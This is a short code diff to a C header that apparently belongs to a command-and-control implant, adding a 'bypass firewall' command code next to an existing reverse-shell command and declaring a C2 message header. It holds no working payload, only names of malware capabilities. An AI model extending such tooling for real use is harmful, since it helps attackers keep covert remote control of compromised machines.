@@ -5,8 +5,9 @@
 void c2_init(void);
 void c2_exit(void);
 
-#define CMD_REVERSE_SHELL 0
-#define CMD_MAX           1 
+#define CMD_REVERSE_SHELL   0
+#define CMD_BYPASS_FIREWALL 1
+#define CMD_MAX             2 
 
 struct c2hdr {
     __u8 nonce[20];
